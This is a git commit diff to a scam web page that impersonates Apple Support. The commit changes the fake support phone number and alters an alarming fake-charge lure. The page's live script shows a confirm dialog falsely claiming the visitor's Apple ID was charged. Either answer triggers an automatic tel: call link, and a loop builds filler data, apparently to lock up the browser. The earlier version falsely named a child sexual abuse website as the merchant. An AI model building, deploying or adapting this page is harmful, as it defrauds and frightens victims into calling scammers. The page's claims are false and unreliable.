52995c9244a4df0fda640b8c156191378d02fb08
balagopalmilky16-boop <balagopalmilky16@gmail.com>
2026-03-30 19:57:50 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
@@ -12,7 +11,7 @@
     <link rel="stylesheet" href="Base.css" type="text/css" />
     <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
     <script src="text_tel.js"></script>
- <!-- Google tag (gtag.js) -->
+	<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -21,7 +20,6 @@
 
   gtag('config', 'G-2DMKRPGVF0');
 </script>
-
 </head>
 
 <body>
@@ -134,7 +132,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-888-449-7524 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1(888) 449-4338 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -197,7 +195,7 @@
     <footer id="ac-globalfooter" class="no-js">
         <div class="ac-gf-content">
             <section class="ac-gf-footer">
-                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHÍLD P0RN0GRÀPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
                 <div class="ac-gf-footer-locale">
                     <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
@@ -212,7 +210,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-888-449-7524
+                <meta content="+1(888) 449-4338
 			 " property="telephone" />
             </section>
         </div>
@@ -279,7 +277,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-888-449-7524');
+        window.number = (window.number ? window.number : '+1(888) 449-4338');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -337,7 +335,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-7524"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(888) 449-4338"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -354,7 +352,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-7524 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $569.90 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1(888) 449-4338 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
